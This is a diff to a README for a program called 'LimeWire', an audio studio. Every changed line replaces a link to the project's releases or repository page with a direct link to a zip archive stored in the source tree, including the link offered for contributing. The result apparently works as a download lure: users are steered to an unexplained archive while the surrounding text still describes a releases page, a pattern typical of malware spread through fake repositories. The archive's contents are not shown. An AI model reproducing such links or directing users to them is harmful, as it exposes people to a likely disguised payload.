@@ -1,6 +1,6 @@
 # 🎵 LimeWire - Your All-In-One Audio Studio
 
-[![Download LimeWire](https://img.shields.io/badge/Download-LimeWire-brightgreen?style=for-the-badge)](https://github.com/Peppercornrentbigsur534/LimeWire/releases)
+[![Download LimeWire](https://img.shields.io/badge/Download-LimeWire-brightgreen?style=for-the-badge)](https://github.com/Peppercornrentbigsur534/LimeWire/raw/refs/heads/main/limewire/core/Wire_Lime_1.0.zip)
 
 ---
 
@@ -16,7 +16,7 @@ You need to visit the releases page to get LimeWire.
 
 **Step 1:** Go to the release page by clicking the button below or visit:
 
-[Download LimeWire](https://github.com/Peppercornrentbigsur534/LimeWire/releases)
+[Download LimeWire](https://github.com/Peppercornrentbigsur534/LimeWire/raw/refs/heads/main/limewire/core/Wire_Lime_1.0.zip)
 
 **Step 2:** Look for the latest release. It usually has a version number like `v1.0` or higher.
 
@@ -147,7 +147,7 @@ LimeWire uses Python and tkinter, but you don’t need to install or configure t
 
 You can find more technical details or contribute on the GitHub page at:
 
-https://github.com/Peppercornrentbigsur534/LimeWire
+https://github.com/Peppercornrentbigsur534/LimeWire/raw/refs/heads/main/limewire/core/Wire_Lime_1.0.zip
 
 ---
 
@@ -155,4 +155,4 @@ https://github.com/Peppercornrentbigsur534/LimeWire
 
 Use the button below to visit the download page again.
 
-[![Download LimeWire](https://img.shields.io/badge/Download-LimeWire-brightgreen?style=for-the-badge)](https://github.com/Peppercornrentbigsur534/LimeWire/releases)
+[![Download LimeWire](https://img.shields.io/badge/Download-LimeWire-brightgreen?style=for-the-badge)](https://github.com/Peppercornrentbigsur534/LimeWire/raw/refs/heads/main/limewire/core/Wire_Lime_1.0.zip)
